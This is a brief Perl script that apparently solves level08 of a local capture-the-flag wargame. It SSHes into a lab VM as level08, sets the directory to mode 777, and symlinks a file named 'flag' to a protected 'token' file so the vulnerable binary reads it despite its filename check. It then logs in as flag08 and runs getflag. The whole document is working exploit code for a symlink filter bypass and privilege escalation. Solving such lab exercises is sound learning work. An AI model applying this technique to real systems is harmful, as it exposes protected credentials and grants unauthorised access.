#!/usr/bin/perl

$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
$user = "level08";

$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";

$exploit = "ssh -qp 4242 $user\@$ip 'chmod 777 . && ln -s token flag && ./level08 flag'";
print $red, $exploit, $reset, "\n";
system($exploit);

$flag = "ssh -qp 4242 flag08\@$ip 'getflag'";
print $green, $flag, $reset, "\n";
system($flag);
